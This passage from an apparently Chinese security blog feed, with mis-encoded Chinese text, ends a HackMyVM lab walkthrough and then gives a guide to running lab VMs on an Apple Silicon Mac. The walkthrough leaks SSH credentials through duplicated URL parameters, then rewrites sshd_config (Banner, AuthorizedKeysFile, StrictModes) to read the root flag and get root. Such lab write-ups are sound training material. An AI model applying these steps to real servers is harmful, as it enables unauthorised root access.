Completed</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.240.147:8080/robots.txt</span><br><span class="line">/redirect</span><br><span class="line">/credz</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.240.147:8080/robots.txt</span><br><span class="line">/redirect</span><br><span class="line">credz                                      </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.240.147:8080//credz    </span><br><span class="line">&lt;a href=<span class="string">&quot;/credz&quot;</span>&gt;Moved Permanently&lt;/a&gt;.        </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.240.147:8080/redirect</span><br><span class="line">Parameter <span class="string">&#x27;url&#x27;</span> needed.            </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.240.147:8080/redirect?url=1</span><br><span class="line">Only accessible internally.                          </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œç»™äº†ä¸¤ä¸ªç›®å½•ï¼Œä½†æ˜¯åˆ†åˆ«å•ç‹¬è®¿é—®éƒ½æ²¡æœ‰ç»“æœï¼Œåœ¨redirectç”¨äº†urlå‚æ•°ä¹Ÿæ²¡ç”¨<br>ä¹‹å‰åšè¿‡ä¸€ä¸ªé¶æœºæœ‰ä¹Ÿæ˜¯ç»™äº†ç›®å½•å¥½åƒæ˜¯secret å’Œ home åé¢ç”¨äº†è¿™ä¸¤ä¸ªçš„ç»„åˆè·¯å¾„<br>è¿™é‡Œä¹Ÿè¯•è¯•  â€“&gt; è¿˜æ˜¯æ²¡ç”¨  æ‰«æäºŒçº§ç›®å½•ä¹Ÿæ²¡æœ‰<br>åŸæ¥è¿™é‡Œçš„urlæç¤ºæ˜¯urlçš„å‚æ•°ä¼ credzå¹¶ä¸”è¦ç»„åˆä¼ ï¼Œè®©httpè§£ææœ€åä¸€ä¸ªå‚æ•°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="regexp">/tmp]</span></span><br><span class="line"><span class="regexp">â””â”€# curl &#x27;http:/</span><span class="regexp">/192.168.240.147:8080/redirect</span>?url=<span class="number">1</span>&amp;url=<span class="regexp">/credz&#x27;</span></span><br><span class="line"><span class="regexp">ssh/</span>EazyLOL </span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°sshçš„ç”¨æˆ·åå’Œå¯†ç   ç”¨æˆ·åå°±æ˜¯ssh</p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>æœ‰ä¸€ä¸ªsudoå‘½ä»¤å¯ä»¥è®©sshæœåŠ¡é‡å¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">jan:</span>~<span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> ssh on <span class="symbol">jan:</span></span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Runas</span> <span class="keyword">and</span> <span class="title class_">Command</span>-specific defaults <span class="keyword">for</span> <span class="symbol">ssh:</span></span><br><span class="line">    <span class="title class_">Defaults</span>!/usr/sbin/visudo env_keep+=<span class="string">&quot;SUDO_EDITOR EDITOR VISUAL&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> ssh may run the following commands on <span class="symbol">jan:</span></span><br><span class="line">    (root) <span class="symbol">NOPASSWD:</span> /sbin/service sshd restart</span><br></pre></td></tr></table></figure></div>
<p>æ‰€ä»¥ç›®æ ‡å°±æ˜¯æ›´æ”¹sshçš„é…ç½®æ–‡ä»¶ï¼Œè®©sshæœåŠ¡é‡å¯ sshd_configï¼ˆä¿®æ”¹çš„æ˜¯å®¢æˆ·ç«¯çš„å†…å®¹ï¼‰</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">X11UseLocalhost <span class="built_in">yes</span></span>                                                                           </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">PermitTTY <span class="built_in">yes</span></span>                                                                                 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">PrintMotd <span class="built_in">yes</span></span>                                                                                 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">PrintLastLog <span class="built_in">yes</span></span>                                                                              </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">TCPKeepAlive <span class="built_in">yes</span></span>                                                                              </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">PermitUserEnvironment no</span>                                                                      </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Compression delayed</span>                                                     </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ClientAliveInterval 0</span>                                                   </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ClientAliveCountMax 3</span>                                                   </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">UseDNS no</span>                                                               </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">PidFile /run/sshd.pid</span>                                                   </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">MaxStartups 10:30:100</span>                                                   </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">PermitTunnel no</span>                                                         </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ChrootDirectory none</span>                              </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">VersionAddendum none</span>                 </span><br><span class="line">                                      </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">no default banner path</span>              </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Banner /root/root.txt</span>                </span><br><span class="line">                                      </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">override default of no subsystems</span>   </span><br><span class="line">Subsystem       sftp    internal-sftp </span><br><span class="line">                                      </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Example of overriding settings on a per-user basis</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Match User anoncvs</span>                   </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">      X11Forwarding no</span>         </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">      AllowTcpForwarding no</span>    </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">      PermitTTY no</span>                                                         </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">      ForceCommand cvs server</span>   </span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå¯ä»¥ä¿®æ”¹bannerå°±å¯ä»¥è¯»å–ä»»ä½•æƒ³è¦çš„æ–‡ä»¶<br>ä½†æ˜¯ç›´æ¥sshç™»å½•ä¼šæŠ¥é”™</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line"><span class="symbol">jan:</span>/etc/ssh<span class="variable">$ </span>ssh root<span class="variable">@locakhost</span></span><br><span class="line"><span class="regexp">/etc/ssh</span><span class="regexp">/ssh_config: line 23: Bad configuration option: banner</span></span><br><span class="line"><span class="regexp">/etc</span><span class="regexp">/ssh/ssh</span><span class="symbol">_config:</span> terminating, <span class="number">1</span> bad configuration options</span><br></pre></td></tr></table></figure></div>
<p>æ ¹æ®é”™è¯¯ä¿¡æ¯ï¼ŒæŠŠssh_configä¸­çš„banneråˆ æ‰</p>
<p>ç„¶åç”¨sshå°±å¯ä»¥è¯»åˆ°flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ssh <span class="symbol">ssh@</span><span class="number">192.168</span><span class="number">.240</span><span class="number">.147</span></span><br><span class="line">HMV2PRMTERWTFUDNGMBG</span><br><span class="line"><span class="symbol">ssh@</span><span class="number">192.168</span><span class="number">.240</span><span class="number">.147</span><span class="string">&#x27;s password: </span></span><br></pre></td></tr></table></figure></div>
<p>å¦‚æœè¦ç™»å½•åˆ°rootï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">AuthorizedKeysFile      .ssh/authorized_keys                                  </span><br></pre></td></tr></table></figure></div>
<p>æŠŠ.ssh&#x2F;authorized_keysä¿®æ”¹æˆæˆ‘ä»¬è‡ªå·±åˆ›çš„ &#x2F;home&#x2F;ssh&#x2F;authorized_keys  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">jan</span>:~$ echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCxliao26atOJyX3C9UgtIxt3RY9S4n921sYgmAxhw5sB58FESP8E+kWMC4QbT2</span><br><span class="line"><span class="attribute">3azUa8zVr76QNhru</span>+LVFTrW5R9SyxDDYQWjfRwDBiSe2X5MNiqoQU4tiW71DGYiO9M0xQNVx5Auvx6Ip6+kJqEpnXoU0Gw4zRxB3HjeEwYIly8HFA</span><br><span class="line"><span class="attribute">TKaOP3Gh7rhwOXJ8gjcF7d6NcnsNbnOeUEArJjDhsax72TIiBYmza0PTg</span>+<span class="number">8</span>YZrjwvDqdZ+swMq5R9SPsn4sLyF5R82wjAajO4ce8qwcIanBxw5KeB</span><br><span class="line"><span class="attribute">fiChtilCaYb0JXH2bNlyQwedGjL2ARtnjgPhIKU</span>/<span class="number">3</span>N42trAcEXDwBCxkLRRGVkgrFDdYN70kcgfo2+<span class="number">7</span>A7hBk2H7EFfY44bGcD9+YDsEqVS38VfxcD</span><br><span class="line"><span class="attribute">HNfM5V1ypS</span>+ZirpY/RXK+<span class="number">46</span>nHfAaieMuhNffS/zegzQEUTR1iHXWvDFOlwS7w3SNiBh4p69NyefputLJEdBhWUrIbsqvIOOzVNC03f7hd0Yq0gsZb</span><br><span class="line"><span class="attribute">vt7g10X4k18Wf7aI</span>/<span class="number">3</span>qg26Yw+LJ9zq1VBSKaon0fTYtxrDGyn3qGeT1dKUyFQzbKkKN19X6VYjlSWzFvEft7lgLixwZnsQabUR8XT0UIwfJbN7FU9</span><br><span class="line"><span class="attribute">j</span>+hQos8PBWXsqZIX1q+by5prOChPXMP9phGofL8q+SrrKdPUZDMxV8Hbw== root@kakeru&#x27; &gt; authorized_keys </span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œä¸è¦ç›´æ¥viè¿›å»ç²˜è´´ç§é’¥å†…å®¹ï¼Œå°±åƒè¿™æ ·echoè¿›å»ï¼ˆæˆ‘è¯•è¿‡ç›´æ¥ç²˜è´´è¿›å»ä½†æ˜¯ä¸è¡Œï¼Œå¯èƒ½æ˜¯æ¢è¡Œä»€ä¹ˆçš„é—®é¢˜)<br>å†…å®¹æ”¹æˆæœ¬æœº &#x2F;.ssh&#x2F;id_rsa.pub<br>è€Œä¸”é…ç½®æ–‡ä»¶ä¸­éœ€è¦ä¿®æ”¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="code"><pre><span class="line">StrictModes <span class="keyword">no</span>  #ä»<span class="keyword">yes</span>æ”¹æˆ<span class="keyword">no</span> æ³¨é‡Šåˆ æ‰</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°rootshell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/.ssh]</span><br><span class="line">â””â”€<span class="comment"># ssh root@192.168.240.147</span></span><br><span class="line">HMV2PRMTERWTFUDNGMBG</span><br><span class="line">Welcome <span class="built_in">to</span> Alpine!</span><br><span class="line"></span><br><span class="line">The Alpine Wiki <span class="keyword">contains</span> <span class="keyword">a</span> large amount <span class="keyword">of</span> how-<span class="built_in">to</span> guides <span class="keyword">and</span> general</span><br><span class="line">information about administrating Alpine systems.</span><br><span class="line">See &lt;<span class="keyword">https</span>://wiki.alpinelinux.org/&gt;.</span><br><span class="line"></span><br><span class="line">You can setup <span class="keyword">the</span> <span class="keyword">system</span> <span class="keyword">with</span> <span class="keyword">the</span> <span class="keyword">command</span>: <span class="title">setup-alpine</span></span><br><span class="line"></span><br><span class="line">You may change this message <span class="keyword">by</span> editing /etc/motd.</span><br><span class="line"></span><br><span class="line">jan:~<span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">0</span>(root),<span class="number">1</span>(bin),<span class="number">2</span>(daemon),<span class="number">3</span>(sys),<span class="number">4</span>(adm),<span class="number">6</span>(disk),<span class="number">10</span>(wheel),<span class="number">11</span>(floppy),<span class="number">20</span>(dialout),<span class="number">26</span>(tape),<span class="number">27</span>(video)</span><br><span class="line">jan:~<span class="comment"># </span></span><br></pre></td></tr></table></figure></div>



]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>macç¯å¢ƒé¶åœºæ­å»º</title>
    <url>/posts/86.html</url>
    <content><![CDATA[<p>Macç¯å¢ƒä¸‹é¶åœºæ­å»º</p>
<span id="more"></span>
<p>å› ä¸ºæˆ‘æ˜¯mac mèŠ¯ç‰‡ç”µè„‘ï¼Œæ‰€ä»¥åœ¨å®‰è£…é¶åœºæ—¶å€™å¦‚æœç›´æ¥ä½¿ç”¨virtualboxä¼šæŠ¥é”™ï¼Œè¿™ç¯‡æ–‡ç« ä»‹ç»äº†æˆ‘å®‰è£…é¶åœºçš„è§£å†³æ–¹æ¡ˆ</p>
<h2 id="utmå®‰è£…"><a href="#utmå®‰è£…" class="headerlink" title="utmå®‰è£…"></a>utmå®‰è£…</h2><p>æˆ‘ä½¿ç”¨çš„è™šæ‹Ÿæœºæ˜¯utm ï¼Œå¯ä»¥æ¨¡æ‹Ÿx86ç³»ç»Ÿï¼Œç›´æ¥åœ¨å®˜ç½‘å…è´¹ä¸‹è½½<br><a href="https://mac.getutm.app/">https://mac.getutm.app/</a><br><img src="https://pic1.imgdb.cn/item/679a4c5cd0e0a243d4f87b67.png"></p>
<h2 id="é¶åœºå®‰è£…åŒ…å¤„ç†"><a href="#é¶åœºå®‰è£…åŒ…å¤„ç†" class="headerlink" title="é¶åœºå®‰è£…åŒ…å¤„ç†"></a>é¶åœºå®‰è£…åŒ…å¤„ç†</h2><p>è¿™é‡Œä»¥ä»vulnhubä¸‹è½½çš„Deathnoteä¸ºä¾‹<br>ä»é¶åœºä¸‹æ¥çš„å®‰è£…åŒ…åº”è¯¥æ˜¯.ovf<br>åœ¨ç»ˆç«¯ç”¨tarè§£å‹è¿™ä¸ªæ–‡ä»¶  è§£å‹å¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶ æˆ‘ä»¬éœ€è¦ç”¨çš„æ˜¯.vmdkæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">(base) kakeru<span class="title">@bogon</span> downloads % tar xvf Deathnote.ova </span><br><span class="line"><span class="keyword">x</span> Deathnote.ovf</span><br><span class="line"><span class="keyword">x</span> Deathnote-disk<span class="number">001</span>.vmdk</span><br><span class="line"><span class="keyword">x</span> Deathnote.mf</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åä¸‹è½½qemu  macç”¨æˆ·å¯ä»¥ç”¨brewä¸‹è½½</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>qemu</span><br></pre></td></tr></table></figure></div>
<p>ç„¶ååœ¨é¶åœºè§£å‹åçš„ç›®å½•ä¸­æ‰§è¡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">qemu-<span class="selector-tag">img</span> convert -<span class="selector-tag">p</span>  -O qcow2 Deathnote-disk001<span class="selector-class">.vmdk</span> Deathnote<span class="selector-class">.qcow2</span> </span><br></pre></td></tr></table></figure></div>
<p>æ‰§è¡ŒåæŠŠ.vmdk æ–‡ä»¶è½¬æ¢æˆ.qcow2æ–‡ä»¶</p>
<h2 id="utmè®¾ç½®"><a href="#utmè®¾ç½®" class="headerlink" title="utmè®¾ç½®"></a>utmè®¾ç½®</h2><p>ç‚¹å‡»åˆ›å»ºè™šæ‹Ÿæœº â€“&gt;  æ¨¡æ‹Ÿ  â€“&gt; å…¶ä»– è¿›å…¥è™šæ‹Ÿæœºé…ç½®<br><img src="https://pic1.imgdb.cn/item/679a4c5ed0e0a243d4f87b68.png"><br>å¯åŠ¨è®¾å¤‡é€‰æ‹©æ— <br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b69.png"><br>ä¿®æ”¹å†…å­˜  ä¸€èˆ¬è™šæ‹Ÿåªè¦åˆ†é…1gä»¥ä¸‹çš„å†…å­˜<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b6a.png"><br>ç„¶åå¯ä»¥ç»™è™šæ‹Ÿæœºèµ·ä¸ªåå­— ç‚¹å‡»å­˜å‚¨<br><img src="https://pic1.imgdb.cn/item/679a4c60d0e0a243d4f87b6b.png"><br>æ¥ç€å³å‡»è™šæ‹Ÿæœº,ç‚¹å‡»ç¼–è¾‘ï¼Œè¿›å…¥è™šæ‹Ÿæœºè®¾ç½®<br>1.åœ¨QEMUä¸­å–æ¶ˆUEFIå¯åŠ¨<br><img src="https://pic1.imgdb.cn/item/679a4c98d0e0a243d4f87b6e.png"><br>2.ç½‘ç»œé€‰æ‹©æ¡¥æ¥(ä½ å¯ä»¥è‡ªå·±é…ç½®ç½‘ç»œï¼Œæ¡¥æ¥æ˜¯æœ€ç®€å•çš„)<br><img src="https://pic1.imgdb.cn/item/679a4c9ad0e0a243d4f87b6f.png"><br>3.å³å‡»IDEé©±åŠ¨å™¨,åˆ é™¤<br><img src="https://pic1.imgdb.cn/item/679a4c9bd0e0a243d4f87b70.png"><br>4.é©±åŠ¨å™¨æ–°å»ºç‚¹å‡»å¯¼å…¥ ï¼Œé€‰æ‹©æˆ‘ä»¬åˆšåˆšè½¬æ¢çš„.qcow2æ–‡ä»¶</p>
<p>æ¥ç€å°±å¯ä»¥å¯åŠ¨è™šæ‹Ÿæœºäº†<br>å¯åŠ¨æˆåŠŸçš„ç”»é¢:<br><img src="https://pic1.imgdb.cn/item/679a4de8d0e0a243d4f87ba6.png"></p>
<h2 id="é¶æœºæ²¡æœ‰åˆ†é…åˆ°ipè§£å†³æ–¹æ¡ˆ"><a href="#é¶æœºæ²¡æœ‰åˆ†é…åˆ°ipè§£å†³æ–¹æ¡ˆ" class="headerlink" title="é¶æœºæ²¡æœ‰åˆ†é…åˆ°ipè§£å†³æ–¹æ¡ˆ"></a>é¶æœºæ²¡æœ‰åˆ†é…åˆ°ipè§£å†³æ–¹æ¡ˆ</h2><p>é¶æœºå¯åŠ¨å  nmapæ‰«æå½“å‰ç½‘æ®µå‘ç°ä¸»æœºip ä½†æ˜¯æœ‰çš„é¶æœºæ²¡æœ‰åˆ†é…åˆ°é¶æœº<br>è¿™æ˜¯ç”±äºé¶æœºä¸­çš„ä½¿ç”¨çš„ç½‘å¡å’Œå…¶é…ç½®æ–‡ä»¶ä¸­çš„ç½‘å¡ä¸åŒ¹é…å¯¼è‡´çš„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~]</span><br><span class="line">â””â”€# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">29</span> <span class="number">23</span>:<span class="number">50</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.0049</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">3</span> hosts <span class="keyword">up</span>) scanned in <span class="number">2.41</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>æ¯”å¦‚æˆ‘è¿™é‡Œè¿™ä¸‰ä¸ªipéƒ½ä¸æ˜¯é¶æœº</p>
<h3 id="ç‰ˆæœ¬1"><a href="#ç‰ˆæœ¬1" class="headerlink" title="ç‰ˆæœ¬1"></a>ç‰ˆæœ¬1</h3><p>è¿™æ—¶ å…ˆå…³é—­é¶æœº åœ¨å¯åŠ¨çš„è“è‰²ç•Œé¢ æŒ‰eè¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼<br>ï¼ˆå¦‚æœä¸€ç›´æ²¡æœ‰å‡ºç°è¿™ä¸ªè“è‰²ç•Œé¢è¯´æ˜ä¸æ˜¯debianç³»çš„ï¼Œåœ¨å¯åŠ¨çš„æ—¶å€™æŒ‰shiftä¹Ÿèƒ½è¿›å…¥è¿™ä¸ªç•Œé¢ï¼‰<br>å…‰æ ‡ä¸‹ç§»  æ‰¾åˆ°roï¼ˆè¿™é‡Œçš„å€’æ•°ç¬¬ä¸‰è¡Œï¼‰ æ”¹æˆrw single init&#x3D;&#x2F;bin&#x2F;bash<br>ctrl + x è¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼<br><img src="https://pic1.imgdb.cn/item/679a51aad0e0a243d4f87be5.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be6.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be7.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">ip <span class="keyword">a</span> <span class="comment">#æŸ¥çœ‹å®é™…ä½¿ç”¨ç½‘å¡ (æˆ‘è¿™é‡Œå°±æ˜¯enp0s1)</span></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be8.png"><br>ç„¶åè¾“å…¥ </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LEAF"><figure class="iseeu highlight /leaf"><table><tr><td class="code"><pre><span class="line">nano /etc/network/interfaces <span class="punctuation">#</span><span class="params">(ç¼–è¾‘ç½‘å¡)</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œç”¨nano ä¸ç”¨vim  vimä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹é¢æ›´æ”¹ä¸äº†å†…å®¹<br>ç„¶åæŠŠç½‘å¡æ›¿æ¢æˆå®é™…çš„ç½‘å¡(enp0s3 æ”¹æˆ enp0s1)<br><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be9.png"><br><img src="https://pic1.imgdb.cn/item/679a5210d0e0a243d4f87bf1.png"><br>ctrl + o ä¿å­˜ å›è½¦ç¡®å®š æœ€åctrl + x é€€å‡º<br>é‡å¯ç½‘ç»œæœåŠ¡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service networking restart</span></span><br></pre></td></tr></table></figure></div>
<p>ç­‰åŠ è½½ä¹‹åé‡å¯è™šæ‹Ÿæœº  å°±å‘ç°å¯ä»¥æ‰«åˆ°ipå•¦ (å¦‚æœè¿˜æ˜¯ä¸è¡Œå¯ä»¥å°è¯•æŠŠutmç½‘ç»œä¸­æ¡¥æ¥çš„ç«¯å£ä»è‡ªåŠ¨æ”¹æˆen0)<br><img src="https://pic1.imgdb.cn/item/679a5211d0e0a243d4f87bf2.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~]</span><br><span class="line">â””â”€# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">30</span> <span class="number">00</span>:<span class="number">07</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.035</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.135</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.17</span>s latency).</span><br><span class="line">MAC Address: B6:<span class="number">9</span>C:<span class="number">5</span>D:<span class="number">4</span>F:DE:AB (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts <span class="keyword">up</span>) scanned in <span class="number">3.69</span> seconds</span><br></pre></td></tr></table></figure></div>
